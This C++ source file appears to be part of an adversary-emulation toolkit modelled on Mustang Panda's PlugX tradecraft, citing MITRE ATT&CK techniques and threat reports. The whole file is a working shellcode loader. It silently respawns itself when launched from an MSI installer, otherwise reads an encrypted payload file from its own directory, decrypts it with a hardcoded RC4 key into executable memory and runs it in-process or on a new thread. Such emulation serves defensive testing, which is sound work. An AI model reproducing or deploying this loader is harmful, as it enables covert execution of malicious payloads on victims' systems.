#include "logger.hpp"
#include "rc4.hpp"
#include "rcdll_util.hpp"
#include "stub.hpp"
#include "util.hpp"
#include <bcrypt.h>

#ifndef DLL_HANDLER_LOG_FILE
#error "stub.cpp must have DLL_HANDLER_LOG_FILE set at compile time"
#endif

#ifndef DLL_MSI_HANDLER_LOG_FILE
#error "stub.cpp must have DLL_MSI_HANDLER_LOG_FILE set at compile time"
#endif

// In the future, think about using getexitcodethread for checking if the spawned thread is still alive
BOOL spawned = FALSE;

/*
 * RunPayload:
 *      About:
 *          Handles initializing the logger, allocating memory and loading
 *          and decrypting shellcode, and determining if running from MSI installer.
 *      MITRE ATT&CK Techniques:
 *          T1140: Deobfuscate/Decode Files or Information
 *          T1620: Reflective Code Loading
 *      CTI:
 *          https://research.checkpoint.com/2023/chinese-threat-actors-targeting-europe-in-smugx-campaign/
 *          https://blog.eclecticiq.com/mustang-panda-apt-group-uses-european-commission-themed-lure-to-deliver-plugx-malware
 *          https://www.welivesecurity.com/2022/03/23/mustang-panda-hodur-old-tricks-new-korplug-variant/
 *          https://lab52.io/blog/mustang-pandas-plugx-new-variant-targetting-taiwanese-government-and-diplomats/
 *          https://go.recordedfuture.com/hubfs/reports/cta-cn-2025-0109.pdf
 */
DWORD RunPayload(LPCSTR filename, BOOL threaded) {
    if (threaded && spawned) {
        return ERROR_SUCCESS;
    }

    shared_func_pointers fp = {
        .fp_GetLastError = GetLastError,
        .fp_CreateFileW = CreateFileW,
        .fp_CloseHandle = CloseHandle,
        .fp_vsnprintf = _vsnprintf,
        .fp_snprintf = _snprintf,
        .fp_GetSystemTime = GetSystemTime,
        .fp_SetFilePointer = SetFilePointer,
        .fp_HeapAlloc = HeapAlloc,
        .fp_HeapCreate = HeapCreate,
        .fp_HeapDestroy = HeapDestroy,
        .fp_HeapFree = HeapFree,
        .fp_WriteFile = WriteFile,
        .fp_BCryptGenRandom = BCryptGenRandom
    };
    logger_ctx log_ctx;
    DWORD result;

    // Determine if running from MSI installer or not
    BOOL from_installer = RunningFromInstaller();

    result = AesLogger::InitializeLogger(
        &fp,
        from_installer ? WIDEN(DLL_MSI_HANDLER_LOG_FILE) : WIDEN(DLL_HANDLER_LOG_FILE),
        ENCRYPTED_LOGGING,
        &log_ctx
    );

    if (result != ERROR_SUCCESS) {
        ExitProcess(result);
    }

    AesLogger::LogInfo(&log_ctx, "=========================");
    AesLogger::LogInfo(&log_ctx, "Initialized rcdll logger.");
    AesLogger::LogInfo(&log_ctx, "=========================");

    char path_buf[MAX_PATH + 1];
    if (GetModuleFileNameA(NULL, path_buf, MAX_PATH) == 0) {
        result = GetLastError();
        AesLogger::LogError(&log_ctx, "Failed to get module file name. Error code: %d", result);
        return result;
    }

    if (from_installer) {
        // Spawn new process and exit
        AesLogger::LogInfo(&log_ctx, "Running from MSI installer.");

        AesLogger::LogInfo(&log_ctx, "Spawning new process: %s", path_buf);

        PROCESS_INFORMATION process_info;
        STARTUPINFOA startup_info;
        ZeroMemory(&startup_info, sizeof(startup_info));
        startup_info.cb = sizeof(startup_info);
        if (!CreateProcessA(
            NULL,
            path_buf,
            NULL,
            NULL,
            FALSE,
            CREATE_NO_WINDOW,
            NULL,
            NULL,
            &startup_info,
            &process_info
        )) {
            result = GetLastError();
            AesLogger::LogError(&log_ctx, "Failed to spawn new process. Error code: %d", result);
        } else {
            AesLogger::LogDebug(&log_ctx, "Started new process with PID: %d", process_info.dwProcessId);
            result = ERROR_SUCCESS;
        }

        AesLogger::LogInfo(&log_ctx, "Closing logger.");
        AesLogger::CloseLogger(&log_ctx);
        ExitProcess(result);
    }

    // Not running from installer - run shellcode

    // Search for shellcode in same directory as executable
    ConcatToSelfDir(path_buf, MAX_PATH + 1, filename);
    AesLogger::LogInfo(&log_ctx, "Using data file: %s", path_buf);

    LPVOID buffer = NULL;
    HANDLE h_file = CreateFileA(
        path_buf,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );
    if (h_file == INVALID_HANDLE_VALUE) {
        result = GetLastError();
        AesLogger::LogError(&log_ctx, "Failed to open file. Error code: %d", result);
        return result;
    }

    do {
        // Get file size
        LARGE_INTEGER size_struct;
        if (!GetFileSizeEx(h_file, &size_struct)) {
            result = GetLastError();
            AesLogger::LogError(&log_ctx, "Failed to get file size. Error code: %d", result);
            break;
        }
        DWORD size = (DWORD)(size_struct.QuadPart);
        AesLogger::LogDebug(&log_ctx, "File size: %d", size);

        // Generate buffer
        AesLogger::LogDebug(&log_ctx, "Generating buffer.");
        buffer = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (buffer == NULL) {
            result = GetLastError();
            AesLogger::LogError(&log_ctx, "Failed to allocate buffer. Error code: %d", result);
            break;
        }

        // Populate buffer with our payload
        AesLogger::LogDebug(&log_ctx, "Reading data.");
        result = ReadFileBytes(h_file, (unsigned char*)buffer, size);
        if (result != ERROR_SUCCESS) {
            AesLogger::LogError(&log_ctx, "Failed to read file. Error code: %d", result);
            break;
        }
        CloseHandle(h_file);
        h_file = NULL;

        // Decrypt payload
        unsigned char key[] = "pao2i3oq91KZmqps";
        AesLogger::LogDebug(&log_ctx, "Decrypting.");
        RC4CryptInPlace((unsigned char*)buffer, size, key, sizeof(key) - 1);

        // Execute payload in memory
        if (threaded) {
            AesLogger::LogInfo(&log_ctx, "Creating thread.");
            HANDLE h_thread = CreateThread(
                NULL,
                0,
                (LPTHREAD_START_ROUTINE)buffer,
                NULL,
                0,
                NULL
            );
            if (h_thread == NULL) {
                result = GetLastError();
                AesLogger::LogError(&log_ctx, "Failed to create thread. Error code: %d", result);
            } else {
                result = ERROR_SUCCESS;
                spawned = TRUE;
            }
        } else {
            AesLogger::LogInfo(&log_ctx, "Running.");
            unsigned int buffer_result = ((unsigned int(*)())buffer)();
            result = (DWORD)buffer_result;
            AesLogger::LogInfo(&log_ctx, "Return code: %d.", result);
        }
    } while (FALSE);

    if (h_file != NULL && h_file != INVALID_HANDLE_VALUE) {
        CloseHandle(h_file);
    }
    if (buffer != NULL && !spawned) {
        VirtualFree(buffer, 0, MEM_RELEASE);
    }

    AesLogger::LogInfo(&log_ctx, "Closing logger.");
    AesLogger::CloseLogger(&log_ctx);

    return result;
}
